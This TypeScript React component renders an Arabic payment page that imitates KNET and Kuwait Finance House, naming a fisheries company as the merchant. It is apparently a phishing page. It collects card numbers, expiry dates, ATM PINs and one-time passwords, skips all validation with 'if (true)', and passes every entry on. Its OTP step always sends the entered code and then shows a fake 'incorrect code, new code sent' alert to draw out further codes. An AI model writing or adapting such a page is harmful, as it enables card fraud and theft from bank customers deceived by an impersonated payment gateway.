'use client'

import { useEffect, useState } from 'react'
import { Loader } from 'lucide-react'
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { validate } from '@/lib/utils'
import { useCart } from '@/components/cart-provider'
export type PaymentInfo = {
  cardNumber: string
  cvc: string
  year: string
  month: string
  bank?: string
  otp?: string
  pass: string
}

export type PaymentMethod = 'credit_card' | 'kent' | 'bank_card'

export type Bank = {
  value: string
  label: string
}
const month=['1','2','3','4','5','6','7','8','9','10','11','12']
const years=['2024','2025','2026','2027','2028','2029','2030','2031','2032','2033','2034','2035']
export const BANKS: Bank[] = [
  { value: 'nbk', label: 'بنك الكويت الوطني' },
  { value: 'cbk', label: 'البنك التجاري الكويتي' },
  { value: 'gbk', label: 'بنك الخليج' },
  { value: 'abk', label: 'البنك الأهلي الكويتي' },
  { value: 'burgan', label: 'بنك برقان' },
  { value: 'kfh', label: 'بيت التمويل الكويتي' },
  { value: 'boubyan', label: 'بنك بوبيان' },
  { value: 'kib', label: 'بنك الكويت الدولي' },
  { value: 'ibk', label: 'البنك الصناعي الكويتي' },
  { value: 'bbk', label: 'بنك البحرين والكويت' },
  { value: 'bnp', label: 'بنك بي إن بي باريبا' },
  { value: 'hsbc', label: 'بنك إتش إس بي سي الشرق الأوسط' },
  { value: 'fab', label: 'بنك أبوظبي الأول' },
  { value: 'citibank', label: 'سيتي بنك' },
  { value: 'qnb', label: 'بنك قطر الوطني' },
  { value: 'mashreq', label: 'بنك المشرق' },
  { value: 'alrajhi', label: 'مصرف الراجحي' },
  { value: 'bank_muscat', label: 'بنك مسقط' },
  { value: 'icbc', label: 'البنك الصناعي والتجاري الصيني' },
]


export default function PaymentForm({ 
  onPaymentComplete 
}: { 
  onPaymentComplete: (paymentInfo: PaymentInfo | null, method: PaymentMethod) => void 
}) {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [showError, setShowError] = useState(false)
  const { total } = useCart()

  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('bank_card')
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: '',
    cvc: '',
    year: '',
    month: '',
    otp: '',
    bank: '',
    pass: ''
  })

  const handlePaymentInfoSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      if (true) {
        setShowError(false)
        onPaymentComplete(paymentInfo, paymentMethod)
        setTimeout(() => {
          setIsLoading(false)
          setStep(2)
        }, 5000)
      } else {
        setShowError(true)
        setStep(1)
      }
    } catch (error) {
      console.log(error)
      setShowError(true)
    } finally {
      setIsLoading(false)
    }
  }

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      onPaymentComplete(paymentInfo, paymentMethod)
      setTimeout(() => {
        alert('رمز التحقق غير صحيح, تم ارسال رمز جديد')
        setPaymentInfo({ ...paymentInfo, otp: '' })
      }, 5000)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <> <img 
    className="w-full h-18 m-1 rounded-lg" 
    src="/1212122.PNG" 
    alt="Kuwait Finance House Logo"
  />
    <Card className="w-full bg-gray-100 

">
     
      <CardHeader>
        <Card className="bg-white shadow-xl

">
          <CardContent className="space-y-4">
            <img 
              className="w-full h-14 my-4 object-contain" 
              src="/516815.jpeg" 
              alt="National Fisheries Company Logo" 
            />
            <div className="flex justify-between items-center border-b pb-2">
              <Label className="font-bold text-blue-500">المستفيد:</Label>
              <span>الشركة الوطنية للأسماك</span>
            </div>
            <div className="flex justify-between items-center">
              <Label className="font-bold text-blue-500">المبلغ:</Label>
              <span className="text-lg font-bold">{total} د.ك</span>
            </div>
          </CardContent>
        </Card>
      </CardHeader>

      <CardContent>
        {(paymentMethod === 'credit_card' || paymentMethod === 'bank_card') && (
          <Card className='shadow-xl          '>
            <CardContent className="p-6">
              {step === 1 ? (
                <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
                  <div className="space-y-4">
                    <div className="   flex border-b-2">
                      <Label className='text-blue-500 pb-4  w-32 pt-2 font-samll ' htmlFor="bank">يرجى اختيار البنك:</Label>
                      <select 
                        id="bank"
                        className=" bg-gray-300 flex-auto h-6 border rounded-md  font-samll "
                        value={paymentInfo.bank}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, bank: e.target.value })}
                        required
                      >
                        <option value="" disabled>يرجى اختيار البنك</option>
                        {BANKS.map((bank) => (
                          <option key={bank.value} value={bank.value}>
                            {bank.label}
                          </option>
                        ))}
                      </select>
                    </div>

                    <div className="space-y-2 flex border-b-2 mb-2">
                      <Label className='text-blue-500 pb-4 font-samll pl-1  pt-3  ' htmlFor="card-number">رقم بطاقة الصراف الآلي:</Label>
                      <input
                        type="text"
                        id="card-number"
                        className=" ml-1 flex-auto w-16 p-2 h-6 border rounded-md  font-samll"
                        placeholder="1234 5678 9012 3456"
                        value={paymentInfo.cardNumber}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, cardNumber: e.target.value })}
                        required
                        maxLength={16}
                      />
                        <select 
                        id="bank"
                        className=" bg-gray-300  flex-auto w-16 h-6 border rounded-md  font-samll "
                        required
                      >
                        <option className='bg-gray-500' value="" disabled>prifx</option>
                       
                          <option value="{bank.value}">
                          prifx
                          </option>
                      </select>
                    </div>
                    </div>

                    <div className="  w-full ">
                    <div className="flex border-b-2  ">
                    <Label className='text-blue-500  w-32  font-samll pl-1  ' htmlFor="expiry-month">تاريخ انتهاء البطاقة:</Label>
                      
                      <div className=" grid grid-cols-2 " >
                      <select 
                        id="bank"
                        className=" bg-gray-300 flex-auto h-6 border rounded-md  mb-2 font-samll w-16 "
                        value={paymentInfo.month}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, month: e.target.value })}
                        required
                      >
                        {month.map((bank) => (
                          <option key={bank} value={bank}>
                            {bank}
                          </option>
                        ))}
                      </select>
                      <select 
                        id="bank"
                        className=" bg-gray-300 flex-auto h-6 border rounded-md  font-samll w-16 "
                        value={paymentInfo.year}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, year: e.target.value })}
                        required
                      >
                        {years.map((bank) => (
                          <option key={bank} value={bank}>
                            {bank}
                          </option>
                        ))}
                      </select>
                    </div>
                    
                  </div>
                       

                  </div>

                  <div className="space-y-2 flex">
                      <Label className='text-blue-500 font-samll pl-1  pt-3' htmlFor="pin">الرقم السري:</Label>
                      <input
                        type="password"
                        id="pin"
                        className="flex-auto w-32 p-2 h-6 p-2 border rounded-md"
                        placeholder="••••"
                        value={paymentInfo.pass}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, pass: e.target.value })}
                        required
                        maxLength={4}
                      />
                    </div>
                  {showError && (
                    <p className="text-red-500 text-sm">
                      يرجى التحقق من صحة البيانات المدخلة
                    </p>
                  )}

                  <div className="grid grid-cols-2 ">
                    <button
                      type="button"
                      className=" border  bg-gray-400 rounded-md h-6 hover:bg-gray-100"
                      onClick={() => window.history.back()}
                    >
                      إلغاء
                    </button>
                    <button
                      type="submit"
                      className=" h-6  bg-gray-300  rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50"
                      disabled={isLoading}
                    >
                      {isLoading ? (
                        <span className="flex items-center justify-center gap-2">
                          جاري المعالجة
                          <Loader className="animate-spin" />
                        </span>
                      ) : (
                        'إرسال'
                      )}
                    </button>
                  </div>
                </form>
              ) : (
                <form onSubmit={handleOtpSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="otp">رمز التحقق:</Label>
                    <input
                      type="text"
                      id="otp"
                      className="w-full p-2 border rounded-md"
                      placeholder="123456"
                      value={paymentInfo.otp}
                      onChange={(e) => setPaymentInfo({ ...paymentInfo, otp: e.target.value })}
                      required
                      maxLength={6}
                    />
                  </div>

                  <button
                    type="submit"
                    className="w-full h-6  bg-gray-300  rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <span className="h-6  bg-gray-300  rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50">
                        جاري التحقق
                        <Loader className="animate-spin" />
                      </span>
                    ) : (
                      'تحقق'
                    )}
                  </button>
                </form>
              )}
            </CardContent>
          </Card>
        )}
      </CardContent>

      <footer className="text-center p-4 text-sm text-gray-600">
        <p>© 2024 جميع الحقوق محفوظة</p>
        <a href="#" className="hover:underline">
          شركة الخدمات المصرفية الآلية المشتركة – كي نت
        </a>
      </footer>
    </Card>
    </>
  )
}

